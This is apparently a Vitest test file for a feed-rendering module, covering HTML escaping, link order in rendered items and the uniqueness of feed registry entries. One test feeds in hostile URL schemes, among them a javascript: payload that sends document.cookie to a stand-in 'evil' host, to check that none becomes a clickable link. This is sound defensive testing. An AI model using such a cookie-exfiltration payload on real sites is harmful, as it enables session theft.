import { describe, expect, it } from 'vitest';
import { FEEDS, esc, pickItemHtml, type FeedPick } from '../../src/lib/feeds';
import { KINDS } from '../../src/site';
import { CATEGORIES } from '../../src/lib/taxonomy';

describe('esc()', () => {
  it('escapes XML/HTML specials', () => {
    expect(esc('<a href="x">&</a>')).toBe('&lt;a href=&quot;x&quot;&gt;&amp;&lt;/a&gt;');
  });

  it('stringifies null/undefined to empty', () => {
    expect(esc(null)).toBe('');
    expect(esc(undefined)).toBe('');
  });
});

describe('pickItemHtml()', () => {
  const pick: FeedPick = {
    title: 'A <test> pick',
    why: 'Because it "matters" & more',
    notes: ['note <one>'],
    summary: 'A summary.',
    source_url: 'https://example.com/primary?a=1&b=2',
    free_link: 'https://example.org/free',
    paywalled: true,
    surfaces: [{ url: 'https://news.ycombinator.com/item?id=1', name: 'Hacker News', points: 100, comments: 42 }],
  };
  const html = pickItemHtml(pick);

  it('links the primary source first', () => {
    expect(html).toContain('https://example.com/primary?a=1&amp;b=2');
    expect(html.indexOf('example.com/primary')).toBeLessThan(html.indexOf('example.org/free'));
  });

  it('includes the free backup link and paywall marker', () => {
    expect(html).toContain('https://example.org/free');
    expect(html).toContain('paywalled');
  });

  it('escapes user-facing text', () => {
    expect(html).toContain('Because it &quot;matters&quot; &amp; more');
    expect(html).toContain('note &lt;one&gt;');
    expect(html).not.toContain('note <one>');
  });

  it('neutralizes hostile URL schemes end-to-end (no clickable javascript:)', () => {
    const hostile = pickItemHtml({
      title: 'trap',
      source_url: 'javascript:fetch("//evil/"+document.cookie)',
      free_link: 'data:text/html,<script>alert(1)</script>',
      paywalled: false,
      surfaces: [{ url: 'vbscript:msgbox(1)', name: 'Evil', points: 1, comments: 0 }],
    });
    // No hostile scheme survives as an href anywhere in the rendered body...
    expect(hostile).not.toMatch(/href="(?:javascript|data|vbscript):/i);
    // ...and the labels degrade to plain text, not a dead-but-present link.
    expect(hostile).toContain('Primary source');
    expect(hostile).not.toContain('<a href="javascript');
  });
});

describe('FEEDS registry', () => {
  it('covers everything + digests + every kind + every category', () => {
    const slugs = new Set(FEEDS.map((f) => f.slug));
    expect(slugs).toContain('everything');
    expect(slugs).toContain('digests');
    for (const kind of KINDS) expect(slugs).toContain(`digests-${kind}`);
    for (const c of CATEGORIES) expect(slugs).toContain(`cat-${c.slug}`);
    expect(FEEDS.length).toBe(2 + KINDS.length + CATEGORIES.length);
  });

  it('has unique paths', () => {
    const paths = FEEDS.map((f) => f.path);
    expect(new Set(paths).size).toBe(paths.length);
  });

  it('has unique slugs', () => {
    const slugs = FEEDS.map((f) => f.slug);
    expect(new Set(slugs).size).toBe(slugs.length);
  });
});
